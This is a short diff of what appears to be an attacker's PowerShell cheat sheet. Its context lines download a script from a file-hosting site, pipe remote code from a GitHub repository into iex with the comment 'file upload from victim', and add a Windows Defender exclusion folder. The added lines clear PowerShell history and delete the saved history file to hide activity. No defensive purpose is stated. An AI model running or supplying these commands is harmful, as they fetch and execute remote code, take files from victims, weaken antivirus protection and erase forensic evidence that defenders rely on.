@@ -5,3 +5,5 @@ Invoke-WebRequest -Uri "https://files.catbox.moe/bg9oqk.ps1" -OutFile "gps.ps1" 
 iex (Invoke-WebRequest "https://raw.githubusercontent.com/anaprivate/loop_shell/refs/heads/main/scripts/fileupfromvic.ps1" -UseBasicParsing).Content    //file upload from victim
 
 Add-MpPreference -ExclusionPath "C:\Users\devil\Desktop\scripts"                             //add a folder exclusion for diffender
+
+Clear-History; Remove-Item (Get-PSReadlineOption).HistorySavePath -Force                     //powershell history remover
